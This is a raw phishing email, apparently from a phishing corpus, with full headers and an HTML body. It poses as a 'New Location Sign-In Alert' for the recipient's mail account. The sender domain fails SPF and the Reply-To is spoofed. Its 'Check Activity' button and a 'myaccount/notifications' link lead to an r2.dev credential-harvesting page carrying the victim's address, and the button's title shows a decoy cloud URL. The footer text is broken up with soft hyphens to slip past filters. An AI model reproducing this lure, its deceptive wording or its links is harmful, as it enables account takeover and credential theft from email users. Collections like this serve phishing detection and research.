@@ -1,0 +1,227 @@
+Return-Path: gmuro@nabetlocal11.org
+Delivered-To: jose@monkey.org
+X-FDA: 81990915846.05.5A48B32
+Received: from vps-07f518f2.vps.ovh.us (vps-07f518f2.vps.ovh.us [15.204.8.10])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 2BD6C1A0018
+	for <jose@monkey.org>; Tue,  9 Apr 2024 19:03:01 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=fail (imf01.b.hostedemail.com: domain of gmuro@nabetlocal11.org does not
+ designate 15.204.8.10 as permitted sender)
+ smtp.mailfrom=gmuro@nabetlocal11.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1712689382;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=IP2PChcCqG9xXuR+9kzEtoUuE37t6/ShRZCwaEnQ8Hg=;
+	b=DjgWqG3CjnzEEPAQM7UkyB+XME8gIF27ZBr6sUIIF3USwHnnF7UfzVZW7NWu9cTreAixAk
+	tVNsQ25ooRjz4bKICD1PWCU2pwHl4nh0Dvhf/AaVqVXFivnzJ6o1Gr2NetQDH0DlR5kRyO
+	6T+HZCjFHCdr8UgkiODwHzqS5EbO6qM=
+ARC-Authentication-Results: i=1;	imf01.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=fail (imf01.b.hostedemail.com: domain of
+ gmuro@nabetlocal11.org does not designate 15.204.8.10 as permitted sender)
+ smtp.mailfrom=gmuro@nabetlocal11.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1712689382; a=rsa-sha256;
+	cv=none;
+	b=t704txKa0zfemzFwbdYZCn2D/woDtOqrLb/216QlyTLqB86DJH7NLZFGAK1phujAhubSgc
+	2ZuhF3n/0TpmtzqvW+OlC3q51MkzKDsyFbrwoNT8HqXEEC4AHetcO4tezkWg1U8slOTovA
+	mKY0Js6nZ091HtPWY3ArgDTG8NHielg=
+Received: from 127.0.0.1 (localhost [IPv6:::1])
+	by vps-07f518f2.vps.ovh.us (Postfix) with ESMTP id 37838619A7
+	for <jose@monkey.org>; Tue,  9 Apr 2024 19:02:16 +0000 (UTC)
+Reply-To: jose@nabetlocal11.org
+From: "monkey.org" <gmuro@nabetlocal11.org>
+To: jose@monkey.org
+Subject: [WARNING] New Location Sign-In Alert!
+Date: 09 Apr 2024 12:02:15 -0700
+Message-ID: <20240409120215.4A95D7037E77FF50@nabetlocal11.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 2BD6C1A0018
+X-Stat-Signature: gmepi9smmng7eig95knrwtr6d88ueitw
+X-Rspam-User: 
+X-Spam-Status: No, score=5.70
+X-HE-Tag: 1712689381-429692
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/oiyXKoUwFet9+qf7pkF6bJvaOpFXGCtzhUo6qRL8GkNs?=
+ =?utf-8?q?hVu1AFgalZUp5eYVARLNVY8DpYCxEJCvgEUDmuaPc+J6iPddHHl5mbfAZUuEjPJ02?=
+ =?utf-8?q?r1azateJnpyRyNewgSVt8eM7suqd1MBSm55uNkFsyGKzex2hnmQrgKPObb+WDrsQz?=
+ =?utf-8?q?kUcw4KI/iXo4LRiNReSeqrWSPrtUqbTrak+y5lOYhYWbo6k15nsfbR7ruOCpRITUJ?=
+ =?utf-8?q?bhTT/7KDqy+Vh+k1EsLn72NHxQajeUCWudN4DBvgmXPeRuWQq1ZVc9xPcEpx4Mo85?=
+ =?utf-8?q?H7cYe/fdxljbdT0S/3WbbArue09FOI4NTKLBG/5zEsfOEdq8=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 100
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<P>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 18p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" h=
+eight=3D"100%" valign=3D"top">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: arial, helvetica, sans-s=
+erif">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: inherit=
+; TEXT-ALIGN: center"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 24p=
+x">New device signed-in to:<BR></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter"><FONT size=3D4><B>jose@monkey.org</B></FONT></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px"></DIV></DIV></TD></T=
+R></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" height=3D"100%" valign=
+=3D"top">
+<table style=3D"FONT-SIZE: 1px; BORDER-COLLAPSE: collapse; LINE-HEIGHT: 1px=
+" height=3D"1" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"=
+center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 1px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolor=3D"#dfdfdf"></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 18p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" h=
+eight=3D"100%" valign=3D"top">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, =
+helvetica, sans-serif">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter">Your account was just signed in to a new device. You're getting this e=
+mail to make sure it was you.</DIV>
+<DIV style=3D"BOX-SIZING: border-box"></DIV></DIV></TD></TR></TBODY></TABLE=
+>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" align=3D"center">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
+"0" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; TEXT-ALIGN: center; M=
+ARGIN: 0px; border-radius: 6px" bgcolor=3D"#186ce3" align=3D"center">
+<A title=3D"Click to open in a new window or tab&#10;https://04-110115-1-h4=
+5r6the-09rtgjue0-rhg0-wfhvgww.obs.af-south-1.myhuaweicloud.com/g4e58i9rg-0h=
+rwe30-f9jw-0hrgb-0whnrevf9iow9r-hbgb-werhg.html?AWSAc..." style=3D"BOX-SIZI=
+NG: border-box; FONT-SIZE: 14px; BORDER-TOP: rgb(255,255,255) 1px solid; BO=
+RDER-RIGHT: rgb(255,255,255) 1px solid; BORDER-BOTTOM: rgb(255,255,255) 1px=
+ solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; P=
+ADDING-LEFT: 18px; BORDER-LEFT: rgb(255,255,255) 1px=20
+solid; DISPLAY: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: normal; PAD=
+DING-RIGHT: 18px; border-radius: 6px; text-decoration-line: none" href=3D"h=
+ttps://pub-10ad806ce9b844a7bd5e0a4c7a59e22c.r2.dev/mail2horde-roundcube.htm=
+l#jose@monkey.org" rel=3Dnoreferrer target=3D_blank><B>Check Activity</B></=
+A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 18p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" h=
+eight=3D"100%" valign=3D"top">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, =
+helvetica, sans-serif">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter">You can also see security activity at</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter"><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(31,36,200)"><A href=
+=3D"https://pub-10ad806ce9b844a7bd5e0a4c7a59e22c.r2.dev/mail2horde-roundcub=
+e.html#jose@monkey.org">myaccount/notifications</A></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box"></DIV></DIV></TD></TR></TBODY></TABLE=
+>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" height=3D"100%" valign=
+=3D"top">
+<table style=3D"FONT-SIZE: 1px; BORDER-COLLAPSE: collapse; LINE-HEIGHT: 1px=
+" height=3D"1" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"=
+center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 1px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolor=3D"#dfdfdf"></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 13px; FONT-FAMILY: Arial, Helvetica, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-L=
+AYOUT: fixed; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 18p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" h=
+eight=3D"100%" valign=3D"top">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, =
+helvetica, sans-serif">
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter"><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(183,183,183)">You re=
+ceived this email to let you know about important changes&nbsp;for jose@mon=
+key.org&nbsp;Account and Services.<BR></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: inherit; TEXT-ALIGN: cen=
+ter"><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(183,183,183)"><SPAN =
+style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: Calibri; COL=
+OR: rgb(58,58,58)"><STRONG>Copyright&nbsp; &copy;2&shy;0&shy;2&shy;4&shy;. =
+&shy;A&shy;l&shy;l&shy; &shy;R&shy;i&shy;g&shy;h&shy;t&shy;s&shy; &shy;R&sh=
+y;e&shy;s&shy;e&shy;r&shy;v&shy;e&shy;d&shy;.</STRONG></SPAN></SPAN></DIV><=
+/DIV></TD></TR></TBODY></TABLE></P></BODY></HTML>
+
